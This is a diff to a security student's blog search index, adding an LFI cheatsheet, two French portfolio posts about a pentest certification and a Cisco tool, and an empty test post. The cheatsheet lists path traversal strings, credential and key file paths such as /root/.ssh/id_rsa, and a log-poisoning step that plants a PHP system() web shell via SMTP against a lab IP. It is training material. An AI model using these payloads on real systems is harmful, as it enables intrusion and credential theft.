@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "LFI",
+    "url": "/posts/lfi/",
+    "categories": "Cheatsheet",
+    "tags": "",
+    "date": "2025-09-26 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "General knowledgesTo comment the end of a query:  %00  #To comment the beginning of a query:  %0AFor path traversal try:  ../../../  ....//....//....//Always try url-encoding / double url-encoding ...",
+    "content": "General knowledgesTo comment the end of a query:  %00  #To comment the beginning of a query:  %0AFor path traversal try:  ../../../  ....//....//....//Always try url-encoding / double url-encoding (via burp) your payloadsWhen you find index.php for example, always try:  index.phps  index.txt  index.php.bak  index.bak  index.php~  index.phps~PathsWindows  C:/boot.ini  C:/windows/win.iniLinux  /etc/passwd  /var/log/dmessage  /var/mail/root  /root/.ssh/id_rsa  /home/{USER}/id_rsaLog poisoningVia mail.logtelnet 10.10.188.150 25MAIL FROM:test@test.comRCPT TO:&lt;?php system($_GET['cmd']); ?&gt;http://10.10.188.150:50000/profile.php?img=../../../../var/log/mail.log"
+  },
+  
+  {
     "title": "ImaginaryCTF - Codenames 2",
     "url": "/posts/imaginaryctf-2025-codenames-2/",
     "categories": "Writeups, CTFTime2025, ImaginaryCTF",
@@ -222,6 +239,40 @@
   },
   
   {
+    "title": "Retex sur une certification de hacking",
+    "url": "/posts/portfolio-jr-pentester/",
+    "categories": "portfolio",
+    "tags": "portfolio",
+    "date": "2025-01-11 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "Lien vers la certification.Dans le cadre de la 3ème année de BUT R&amp;T parcours cyber, j’ai fais le choix d’élargir, de certifier, mais surtout de professionnaliser mes compétences en tests d’int...",
+    "content": "Lien vers la certification.Dans le cadre de la 3ème année de BUT R&amp;T parcours cyber, j’ai fais le choix d’élargir, de certifier, mais surtout de professionnaliser mes compétences en tests d’intrusion en suivant le Jr Pentest Certificate. J’ai choisi cette certification car elle est au prix de 40€ environ (ce qui est peu, comparativement à certaines certification qui sont offertes a des prix de +1000€), et qu’elle est assez reconnue par les professionnels du domaine.Mon profil étant initialement très axé sur la cybersécurité offensive (exploitation de vulnérabilités, rédaction d’exploits et enfin prise de shells), cette certification m’a permis d’aborder de manière structurée l’ensemble du flux d’un test d’intrusion, qui était plutôt confus avant que je passe la certification. La méthodologie en question se nomme le PTES, (Penetration Testing Execution Standard): reconnaissance, scan, enumeration, exploitation, et les phases sur lesquelles je manquais cruellement d’expérience, bien qu’elles soient essentielles dans tout test d’intrusion professionnel digne de ce nom: la post-exploitation (en particulier sur Windows, et dans les environnement Active Directory) et la rédaction de rapport (ou reporting, c’est à dire écrire un rapport concernant les vulnérabilités découvertes, avec le contexte, un score de criticité).Sur le plan technique, j’ai révisé et approfondi des méthodes et outils essentiels de pentest tel que Nmap (en particulier le scripting NSE), Nikto et Amass pour la découverte d’infrastructures et de surfaces d’attaque. Pour l’énumération enum4linux, rpcclient, SMBClient et enfin Burp Suite, ffuf pour la partie énumeration web. J’ai également travaillé sur des scénarios de privilege escalation local, en particulier sur Windows, ou je manquais d’expérience, et sur la post-exploitation (persistence, exfiltration de données, récupération de credentials).En conclusion, ce parcours TryHackMe Pentest Junior a consolidé mes acquis offensifs tout en m’apportant un cadre méthodologique et des notions défensives indispensables (détection, journalisation, remédiation), l’obtention de la certification associée au learning path atteste d’un niveau sur ces compétences pratiques et méthodologiques, et surtout, il valide ces compétences auprès d’un public technique. À l’avenir, je vais profiter de cette certification pour chercher un travail dans le domaine de la cybersécurité offensive. Elle pourrait également me permettre de valider mes compétences directement auprès des clients, si je décide de travailler en freelance."
+  },
+  
+  {
+    "title": "Retex sur une certification de hacking",
+    "url": "/posts/developpement/",
+    "categories": "portfolio",
+    "tags": "portfolio",
+    "date": "2025-01-11 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "De nos jours il est impératif d’avoir un CV avec une catégorie “expériences” bien fournies si l’on veut trouver un stage aisément. Or pour remplir la catégorie sus-dites, deux choix se démarquent c...",
+    "content": "De nos jours il est impératif d’avoir un CV avec une catégorie “expériences” bien fournies si l’on veut trouver un stage aisément. Or pour remplir la catégorie sus-dites, deux choix se démarquent clairement.Biensur, on peut chercher un travail au sein d’une entreprise, mais il faut alors que ce travail ait un lien avec le domaine où l’on souhaite travailler plus tard, si l’on souhaite pouvoir le mettre en avant lors d’un entretien d’embauche. Ce n’est pas donné à tout le monde.On peut également réaliser des projets personnels à portée professionnelle. J’entends par là des projets personnels, qui pourront être utilisés professionnellement, ou qui démontrent une maitrise dans des technologies utilisées dans le monde de l’entreprise.C’est cette deuxième option que j’ai choisi, et c’est ainsi que je me suis lancé dans le développement d’un nouvel outil durant ces dernières vacances d’été.Pour faire d’une pierre deux coups, j’ai eu l’idée de développer un outil qui me serait utile dans ce BUT, et qui pourrait être profitable pour les futurs élèves.Pour faire d’une pierre trois coups, j’ai choisi le langage python, qui est un langage très en vogue en ce moment. Il est notamment premier dans l’index TIOBE, qui est un index sérieux qui recense les langages de programmations les plus recherchés.L’outil que j’ai développé fournit une interface graphique, qui permet la simplification de la configuration des routeurs Cisco. En effet, configurer un équipement Cisco est souvent assez complexes, avec un grand nombre de commandes à taper, et parfois, il suffit d’oublier une seule commande sans importance pour que rien ne fonctionne correctement. Il me semblait évident qu’il fallait automatiser ceci.Après deux mois de développement, le projet était déjà bien avancé. Je l’ai donc rendu public sur github. Voici le lien.J’ai donc ajouté un paragraphe dans mon CV mentionnant la réalisation de cet outil, en appuyant sur les compétences nécessaires à la réalisation de cet outil. Des compétences en réseau, en automatisation, et dans le langage python.En prospectant avec ce CV, j’ai fini par trouver un stage dans le secteur géographique où je réside, dans le domaine de la cybersécurité."
+  },
+  
+  {
     "title": "Opacity",
     "url": "/posts/thm-opacity/",
     "categories": "Writeups, TryHackMe",
@@ -440,6 +491,23 @@
     
     "snippet": "2022-06-03-vsftpdexploit🚀 UsageThis poc script allows you to exploit the CVE-2011-2523 (VsFTPd 2.3.4 Backdoor Command Execution)POC script help menuSourceThe source code and installation instructio...",
     "content": "2022-06-03-vsftpdexploit🚀 UsageThis poc script allows you to exploit the CVE-2011-2523 (VsFTPd 2.3.4 Backdoor Command Execution)POC script help menuSourceThe source code and installation instructions are accessible here."
+  },
+  
+  {
+    "title": "Mermaid",
+    "url": "/posts/mermaid/",
+    "categories": "Test",
+    "tags": "test",
+    "date": "2020-12-31 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "                              ",
+    "content": "                              "
   }
   
 ]
